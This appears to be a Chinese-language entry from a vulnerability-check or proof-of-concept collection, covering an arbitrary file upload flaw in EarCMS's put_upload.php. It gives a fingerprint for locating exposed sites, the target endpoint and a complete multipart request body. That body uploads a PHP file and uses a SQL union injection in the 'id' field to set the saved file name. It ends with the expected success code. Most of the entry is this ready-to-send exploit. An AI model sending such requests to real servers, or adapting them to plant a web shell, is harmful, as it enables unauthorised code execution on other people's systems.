# EarCMSput_upload.php任意文件上传漏洞

- **系统**：EarCMSput　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`app="EearCMS"`
- **请求**：`POST /source/index/put_upload.php HTTP/1.1`
- **关键头**：`Content-Type: multipart/form-data;boundary=---------------------------5156…`

**请求体 / payload**
```
-----------------------------51564987891651984798165156489
Content-Disposition: form-data; name="ipa"; filename="dudesuite"
Content-Type: application/x-msdownload
<?php echo "dudesuite";unlink(__FILE__);?>
-----------------------------51564987891651984798165156489
Content-Disposition: form-data; name="id"
-1  union SELECT "dudesuite.php";
-----------------------------51564987891651984798165156489
Content-Disposition: form-data; name="pw"
month-cf3b79c6e54ca7a8d50cdc8aedcde407
-----------------------------51564987891651984798165156489--
```
- **预期**：200　|　—